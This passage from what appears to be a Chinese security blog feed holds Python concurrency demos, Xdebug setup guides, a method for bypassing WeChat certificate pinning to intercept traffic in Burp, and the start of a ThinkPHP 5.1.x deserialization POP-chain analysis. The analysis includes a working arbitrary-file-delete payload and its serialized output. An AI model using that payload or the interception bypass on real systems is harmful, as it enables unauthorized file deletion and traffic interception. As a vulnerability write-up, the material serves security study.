class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fn)</span>:</span></span><br><span class="line">  <span class="comment">#fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line">  print(<span class="string">"进程ID"</span>,os.getpid())</span><br><span class="line">  print(fn*fn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">（1）引入threadpool模块</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（2）定义线程函数   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（3）创建线程 池threadpool.ThreadPool()   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（4）创建需要线程池处理的任务即threadpool.makeRequests()   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（5）将创建的多个任务put到线程池中,threadpool.putRequest   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（6）等到所有任务处理完毕theadpool.pool()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  testFL = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'单进程:'</span>) <span class="comment">#顺序执行(也就是串行执行，单进程)</span></span><br><span class="line">  s = time.time()</span><br><span class="line">  <span class="keyword">for</span> fn <span class="keyword">in</span> testFL:</span><br><span class="line">    run(fn)</span><br><span class="line">  t1 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"顺序执行时间："</span>, int(t1 - s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'多个线程并发:'</span>)</span><br><span class="line"></span><br><span class="line">  pool = threadpool.ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">  调用makeRequests创建了要开启多线程的函数</span><br><span class="line">  requests = threadpool.makeRequests(run,testFL)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 将所有要运行多线程的请求扔进线程池</span></span><br><span class="line">  <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">      pool.putRequest(req)</span><br><span class="line">  pool.wait() <span class="comment">#等待所有的线程完成工作后退出</span></span><br><span class="line"></span><br><span class="line">  t2 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"并行执行时间："</span>, int(t2-t1))</span><br></pre></td></tr></table></figure><ul><li>进程池</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fn)</span>:</span></span><br><span class="line">  <span class="comment">#fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line">  print(<span class="string">"进程ID"</span>,os.getpid())</span><br><span class="line">  print(fn*fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  testFL = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'单进程:'</span>) <span class="comment">#顺序执行(也就是串行执行，单进程)</span></span><br><span class="line">  s = time.time()</span><br><span class="line">  <span class="keyword">for</span> fn <span class="keyword">in</span> testFL:</span><br><span class="line">    run(fn)</span><br><span class="line">  t1 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"顺序执行时间："</span>, int(t1 - s))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'多个进程，并行执行:'</span>) <span class="comment">#创建多个进程，并行执行</span></span><br><span class="line">  pool = Pool(<span class="number">3</span>)  <span class="comment">#创建拥有10个进程数量的进程池</span></span><br><span class="line">  <span class="comment">#testFL:要处理的数据列表，run：处理testFL列表中数据的函数</span></span><br><span class="line">  pool.map(run, testFL)</span><br><span class="line"></span><br><span class="line">  pool.close()<span class="comment">#关闭进程池，不再接受新的进程</span></span><br><span class="line">  pool.join()<span class="comment">#主进程阻塞等待子进程的退出</span></span><br><span class="line">  t2 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"并行执行时间："</span>, int(t2-t1))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓安卓微信小程序包抓取不到数据包的解决方法</title>
      <link href="/2019/12/30/%E6%8A%93%E5%AE%89%E5%8D%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/12/30/%E6%8A%93%E5%AE%89%E5%8D%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？"><a href="#项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？" class="headerlink" title="项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？"></a>项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？</h2><p><strong>看到一个大佬分享的文章内容：</strong><br><strong>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</strong></p><p>以上为大前提，我寻找了一个认为比较简单的方法：<br>准备工具：<br>①　XposedInstaller_3.1.5.apk<br>②　weixin673android1360.apk（要低于7版本）<br>③　JustTrustMe1.apk<br>④　BurpsuiteV2.0<br>⑤　夜神最新版（使用的是安卓5）</p><p><a href="https://pan.baidu.com/s/1qhivzmRiAmWJnf7Z-VMjhQ（123工具已分享）" target="_blank" rel="noopener">https://pan.baidu.com/s/1qhivzmRiAmWJnf7Z-VMjhQ（123工具已分享）</a></p><ol><li>这种方法的好处是不用额外买真机测试，直接在模拟器上进行操作即可，于是乎就可以愉快玩耍了。</li></ol><p><img src="https://img-blog.csdnimg.cn/2019123013163849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>小白需要注意： 先自行安装xposed的框架，安装完毕需要重启</li></ol><p><img src="https://img-blog.csdnimg.cn/20191230131713223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li>JustTrustMe模块需要勾选</li></ol><p><img src="https://img-blog.csdnimg.cn/20191230131739792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.最后挂上代理到burp</p><p>搬运大佬的知识学习 天之胶纸的</p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpStorm配置xdebug</title>
      <link href="/2019/12/20/phpStorm%E9%85%8D%E7%BD%AExdebug/"/>
      <url>/2019/12/20/phpStorm%E9%85%8D%E7%BD%AExdebug/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>运行环境：<br>PHPSTORM版本 : 2019.3 汉化<br>PHP版本 : php-7.0.12-nts<br>xdebug版本：php_xdebug-2.6.0beta1-7.0-vc14-nts<br>ps : php版本和xdebug版本一定要相对应<br>xdebug下载地址：<a href="http://xdebug.org/download.php" target="_blank" rel="noopener">http://xdebug.org/download.php</a></p><h2 id="1-环境下的php-ini中添加关于xdebug的配置信息"><a href="#1-环境下的php-ini中添加关于xdebug的配置信息" class="headerlink" title="1.环境下的php.ini中添加关于xdebug的配置信息"></a>1.环境下的php.ini中添加关于xdebug的配置信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\php\php-5.6.27-nts\ext\php_xdebug.dll"</span></span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=<span class="number">9000</span></span><br><span class="line">xdebug.idekey=PHPSTORM</span><br></pre></td></tr></table></figure><h2 id="2-重启查看phpinfo-会显示有关xdebug的信息"><a href="#2-重启查看phpinfo-会显示有关xdebug的信息" class="headerlink" title="2.重启查看phpinfo()会显示有关xdebug的信息"></a>2.重启查看phpinfo()会显示有关xdebug的信息</h2><h2 id="3-开始配置phpStorm"><a href="#3-开始配置phpStorm" class="headerlink" title="3.开始配置phpStorm"></a>3.开始配置phpStorm</h2><p>1.客户端调试，打开phpStorm，进入File&gt;Settings&gt;PHP&gt;Servers，这里要填写服务器端的相关信息，name填localhost，host填localhost，port填80，debugger选[XDebug]<br><img src="https://img-blog.csdnimg.cn/20191220143254447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.进入File&gt;Settings&gt;PHP&gt;Debug，看到XDebug选项卡，port填9000，其他默认<br>端口和php.ini的配置要一致<br><img src="https://img-blog.csdnimg.cn/20191220143206796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.进入File&gt;Settings&gt;PHP&gt;Debug&gt;DBGp Proxy，IDE key 填 phpStorm，host 填localhost，port 填80</p><p><img src="https://img-blog.csdnimg.cn/20191220143141931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>此时phpstorm上面的调试运行按钮是灰色的</p><p><img src="https://img-blog.csdnimg.cn/20191220143344720.png" alt="在这里插入图片描述"></p><p>点击+号增加服务<br><img src="https://img-blog.csdnimg.cn/20191220143408198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>先配置server</p><p><img src="https://img-blog.csdnimg.cn/20191220143331730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打上断点，此时调试运行按钮已经变绿 点击调试按钮即可开始进行调试<br><img src="https://img-blog.csdnimg.cn/20191220143455269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy开启XDebug无效打不开坑点</title>
      <link href="/2019/12/20/phpStudy%E5%BC%80%E5%90%AFXDebug%E6%97%A0%E6%95%88%E6%89%93%E4%B8%8D%E5%BC%80%E5%9D%91%E7%82%B9/"/>
      <url>/2019/12/20/phpStudy%E5%BC%80%E5%90%AFXDebug%E6%97%A0%E6%95%88%E6%89%93%E4%B8%8D%E5%BC%80%E5%9D%91%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="1-造成开启XDebug无效原因"><a href="#1-造成开启XDebug无效原因" class="headerlink" title="1. 造成开启XDebug无效原因"></a>1. 造成开启XDebug无效原因</h2><p><strong>1. 路径不正确</strong><br>在php.ini文件中zend_extension路径不正确，例如：正反斜杠、路径不对问题</p><p><strong>2. php_debug扩展版本不匹配</strong></p><p><strong>php_debug扩展32位或者64位与安装PHP的不对应</strong><br>PHP7.2版本，实际下载的php_debug版本是PHP7.1，就会造成开启debug失败<br><strong>注意下载的php_debug扩展NTS/TS 与安装PHP对应</strong><br>一般的集成环境中，<code>**PHP的架构都是**32位的（x86）****，</code>而你的电脑是64位（x64），<code>以PHP的环境架构为准</code>，例如：我的使用的PHP是x32为，电脑是win10 64位，我直接到xdebug官网下载64位扩展，导致开启扩展失败<br><strong>3. 配置文件写的不全</strong><br>下面给出</p><h2 id="2-具体开启XDebug流程"><a href="#2-具体开启XDebug流程" class="headerlink" title="2. 具体开启XDebug流程"></a>2. 具体开启XDebug流程</h2><p><em><strong>版本一定要一致</strong></em><br><strong>1、使用phpinfo函数查看PHP版本信息需要注意的如下：</strong></p><p><img src="https://img-blog.csdnimg.cn/20191220140707338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、按照上图红框内的信息到<code>https://xdebug.org/download.php</code>下载对应的xdebug扩展</strong><br>需要注意的地方是xdebug官网中<br>没有带（TS）为非线性安全版本（NTS）<br>没有带（TS）为非线性安全版本（NTS）<br>没有带（TS）为非线性安全版本（NTS）<br><img src="https://img-blog.csdnimg.cn/20191220141048558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、在php.ini文件中添加如下信息：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\ext\此处为刚刚下载好的路径"</span></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为<span class="number">0</span></span><br><span class="line">xdebug.auto_trace=<span class="number">1</span></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为<span class="number">0</span></span><br><span class="line">xdebug.collect_params=<span class="number">1</span></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为<span class="number">0</span></span><br><span class="line">xdebug.collect_return=<span class="number">1</span></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line">xdebug.trace_output_dir =<span class="string">"F:\PHP_xdebug"</span></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line">xdebug.profiler_output_dir =<span class="string">"F:\PHP_xdebug"</span></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为<span class="number">0</span></span><br><span class="line">xdebug.profiler_enable = <span class="number">1</span></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line">xdebug.profiler_output_name = <span class="string">"cachegrind.out.%t.%p"</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line">xdebug.remote_handler = <span class="string">"dbgp"</span></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_host = <span class="string">"127.0.0.1"</span></span><br><span class="line">xdebug.remote_port = <span class="number">9000</span></span><br></pre></td></tr></table></figure><p><strong>4、重启Apache服务器</strong></p><p>查看phpinfo开启成功<br><img src="https://img-blog.csdnimg.cn/20191220141539211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 反序列化深入分析pop利用链</title>
      <link href="/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="Thinkphp-反序列化深入分析"><a href="#Thinkphp-反序列化深入分析" class="headerlink" title="Thinkphp 反序列化深入分析"></a>Thinkphp 反序列化深入分析</h3><ul><li><a href="#_2">环境搭建</a></li><li><a href="#_10">铺垫知识</a></li><li><a href="#_89">漏洞起点</a></li><li><ul><li><a href="#rce_136">rce部分起点</a></li><li><a href="#_271">代码执行点分析</a></li><li><a href="#POC_593">最终POC</a></li></ul></li></ul><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>Thinkphp 5.1.37</strong> -—- 应该是5.1.x可以</p><p>php 7.0.12</p><p>composer create-project topthink/think=5.1.37 v5.1.37</p><h1 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h1><p><strong>1. PHP反序列化原理</strong><br>PHP反序列化就是在读取一段字符串然后将字符串反序列化成php对象。<br><strong>2. 在PHP反序列化的过程中会自动执行一些魔术方法</strong></p><p>方法名 -————–调用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__call调用不可访问或不存在的方法时被调用</span><br><span class="line">__callStatic调用不可访问或不存在的静态方法时被调用</span><br><span class="line">__clone进行对象clone时被调用，用来调整对象的克隆行为</span><br><span class="line">__constuct构建对象的时被调用；</span><br><span class="line">__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</span><br><span class="line">__destruct明确销毁对象或脚本结束时被调用；</span><br><span class="line">__get读取不可访问或不存在属性时被调用</span><br><span class="line">__invoke当以函数方式调用对象时被调用</span><br><span class="line">__isset对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line">__set当给不可访问或不存在属性赋值时被调用</span><br><span class="line">__set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</span><br><span class="line">__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line">__toString当一个类被转换成字符串时被调用</span><br><span class="line">__unset对不可访问或不存在的属性进行unset时被调用</span><br><span class="line">__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作</span><br></pre></td></tr></table></figure><p><strong>3. 反序列化的常见起点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 一定会调用</span><br><span class="line"></span><br><span class="line">__destruct 一定会调用</span><br><span class="line"></span><br><span class="line">__toString 当一个对象被反序列化后又被当做字符串使用</span><br></pre></td></tr></table></figure><p><strong>4.反序列化的常见中间跳板:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__toString 当一个对象被当做字符串使用</span><br><span class="line"></span><br><span class="line">__get 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__set 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line"></span><br><span class="line">形如 $this-&gt;$func();</span><br></pre></td></tr></table></figure><p><strong>5.反序列化的常见终点:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__call 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">call_user_func 一般php代码执行都会选择这里</span><br><span class="line"></span><br><span class="line">call_user_func_array 一般php代码执行都会选择这里</span><br></pre></td></tr></table></figure><p><strong>6.Phar反序列化原理以及特征</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;伪协议会在多个函数中反序列化其metadata部分</span><br><span class="line"></span><br><span class="line">受影响的函数包括不限于如下:</span><br><span class="line"></span><br><span class="line">copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,</span><br><span class="line">fileinode,filemtime,fileowner,fileperms,</span><br><span class="line">fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,</span><br><span class="line">is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,</span><br><span class="line">imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,</span><br><span class="line">get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo</span><br></pre></td></tr></table></figure><h1 id="漏洞起点"><a href="#漏洞起点" class="headerlink" title="漏洞起点"></a>漏洞起点</h1><p>漏洞起点在\thinkphp\library\think\process\pipes\windows.php的__destruct魔法函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__destruct()里面调用了两个函数，我们跟进removeFiles()函数。</p><p><img src="https://img-blog.csdnimg.cn/20200106153640755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>这里看到 unlink函数<br>这里同时也存在一个任意文件删除的漏洞，Payload构造： 必须使用namespace设置命名空间！</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="string">'D:\\phpStudy\\PHPTutorial\\WWW\\tp5\\install.lock'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjQ0OiJEOlxwaHBTdHVkeVxQSFBUdXRvcmlhbFxXV1dcdHA1XGluc3RhbGwubG9jayI7fX0&#x3D;</span><br></pre></td></tr></table></figure><p>这里只需要一个反序列化漏洞的触发点，便可以实现任意文件删除。<br>自行构造一个利用点，试用一下<br>复现成功</p><p><img src="https://img-blog.csdnimg.cn/20200106154101612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="rce部分起点"><a href="#rce部分起点" class="headerlink" title="rce部分起点"></a>rce部分起点</h2><p><strong>在removeFiles()中使用了file_exists对 filename进行了处理。$filename会被作为字符串处理。<br><img src="https://img-blog.csdnimg.cn/20200106154555433.png" alt="在这里插入图片描述"><br>而__toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发__toString 方法。我们全局搜索__toString方法。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200106154654367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" 